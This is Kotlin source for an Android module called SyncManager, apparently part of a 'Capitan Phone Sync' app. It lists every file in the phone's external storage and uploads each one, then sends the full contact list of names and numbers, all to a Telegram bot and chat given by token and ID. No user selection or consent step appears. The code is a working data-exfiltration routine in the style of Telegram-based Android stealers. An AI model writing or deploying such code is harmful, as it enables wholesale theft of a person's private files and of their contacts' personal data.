
package com.capitan.phonesync

import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import android.provider.ContactsContract
import android.provider.OpenableColumns
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.io.DataOutputStream

object SyncManager {

    private const val API = "https://api.telegram.org"
    private const val MAX_SIZE = 49L * 1024L * 1024L

    data class SyncResult(
        val sent: Int,
        val failed: Int,
        val skipped: Int
    )

    suspend fun syncAll(
        context: Context,
        botToken: String,
        chatId: String,
        onProgress: (String) -> Unit = {}
    ): SyncResult = withContext(Dispatchers.IO) {

        var sent = 0
        var failed = 0
        var skipped = 0

        if (botToken.isBlank() || chatId.isBlank()) {
            return@withContext SyncResult(0, 0, 0)
        }

        val files = mutableListOf<Uri>()

        try {
            val collection = MediaStore.Files.getContentUri("external")

            val projection = arrayOf(
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.SIZE
            )

            context.contentResolver.query(
                collection,
                projection,
                null,
                null,
                MediaStore.Files.FileColumns.DATE_ADDED + " ASC"
            )?.use { cursor ->

                val idColumn = cursor.getColumnIndexOrThrow(
                    MediaStore.Files.FileColumns._ID
                )

                val sizeColumn = cursor.getColumnIndexOrThrow(
                    MediaStore.Files.FileColumns.SIZE
                )

                while (cursor.moveToNext()) {
                    val id = cursor.getLong(idColumn)
                    val size = cursor.getLong(sizeColumn)

                    if (size > MAX_SIZE) {
                        skipped++
                        continue
                    }

                    files.add(
                        Uri.withAppendedPath(collection, id.toString())
                    )
                }
            }

        } catch (e: Exception) {
            onProgress("خطا در خواندن فایل‌ها: ${e.message}")
        }

        for ((index, uri) in files.withIndex()) {
            onProgress("ارسال فایل ${index + 1} از ${files.size}")

            if (sendFile(context, botToken, chatId, uri)) {
                sent++
            } else {
                failed++
            }
        }

        onProgress("در حال انتقال مخاطبین...")
        val contactsSent = sendContacts(context, botToken, chatId)

        if (contactsSent) sent++ else failed++

        SyncResult(sent, failed, skipped)
    }

    suspend fun sendFile(
        context: Context,
        botToken: String,
        chatId: String,
        uri: Uri
    ): Boolean = withContext(Dispatchers.IO) {

        try {
            val resolver = context.contentResolver

            var fileName = "file"

            resolver.query(
                uri,
                arrayOf(OpenableColumns.DISPLAY_NAME),
                null,
                null,
                null
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val index = cursor.getColumnIndex(
                        OpenableColumns.DISPLAY_NAME
                    )
                    if (index >= 0) {
                        fileName = cursor.getString(index) ?: "file"
                    }
                }
            }

            val mime = resolver.getType(uri)
                ?: "application/octet-stream"

            val boundary = "CapitanSyncBoundary"

            val connection = URL(
                "$API/bot$botToken/sendDocument"
            ).openConnection() as HttpURLConnection

            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.connectTimeout = 30000
            connection.readTimeout = 120000
            connection.setChunkedStreamingMode(65536)

            connection.setRequestProperty(
                "Content-Type",
                "multipart/form-data; boundary=$boundary"
            )

            DataOutputStream(connection.outputStream).use { output ->

                fun field(name: String, value: String) {
                    output.writeBytes("--$boundary\r\n")
                    output.writeBytes(
                        "Content-Disposition: form-data; name=\"$name\"\r\n\r\n"
                    )
                    output.write(value.toByteArray(Charsets.UTF_8))
                    output.writeBytes("\r\n")
                }

                field("chat_id", chatId)

                val safeName = fileName
                    .replace("\"", "_")
                    .replace("\r", "_")
                    .replace("\n", "_")

                output.writeBytes("--$boundary\r\n")
                output.writeBytes(
                    "Content-Disposition: form-data; name=\"document\"; filename=\"$safeName\"\r\n"
                )
                output.writeBytes("Content-Type: $mime\r\n\r\n")

                resolver.openInputStream(uri)?.use {
                    it.copyTo(output)
                } ?: throw Exception("Cannot open file")

                output.writeBytes("\r\n--$boundary--\r\n")
                output.flush()
            }

            val response = if (connection.responseCode in 200..299) {
                connection.inputStream.bufferedReader().use {
                    it.readText()
                }
            } else {
                connection.errorStream?.bufferedReader()?.use {
                    it.readText()
                } ?: ""
            }

            connection.disconnect()
            JSONObject(response).optBoolean("ok", false)

        } catch (e: Exception) {
            false
        }
    }

    private suspend fun sendContacts(
        context: Context,
        botToken: String,
        chatId: String
    ): Boolean = withContext(Dispatchers.IO) {

        try {
            val contacts = StringBuilder("CAPITAN PHONE SYNC\nCONTACTS\n\n")

            context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null,
                null,
                null
            )?.use { cursor ->

                val nameIndex = cursor.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                )

                val numberIndex = cursor.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )

                while (cursor.moveToNext()) {
                    val name = cursor.getString(nameIndex) ?: ""
                    val number = cursor.getString(numberIndex) ?: ""

                    contacts.append(name)
                        .append(" : ")
                        .append(number)
                        .append("\n")
                }
            }

            val text = contacts.toString()
            val chunks = text.chunked(3000)

            for (chunk in chunks) {
                val connection = URL(
                    "$API/bot$botToken/sendMessage"
                ).openConnection() as HttpURLConnection

                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.connectTimeout = 20000
                connection.readTimeout = 30000
                connection.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=UTF-8"
                )

                val body = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", chunk)
                }

                connection.outputStream.use {
                    it.write(body.toString().toByteArray(Charsets.UTF_8))
                }

                val response = if (connection.responseCode in 200..299) {
                    connection.inputStream.bufferedReader().use {
                        it.readText()
                    }
                } else {
                    connection.errorStream?.bufferedReader()?.use {
                        it.readText()
                    } ?: ""
                }

                connection.disconnect()

                if (!JSONObject(response).optBoolean("ok", false)) {
                    return@withContext false
                }
            }

            true

        } catch (e: Exception) {
            false
        }
    }
}
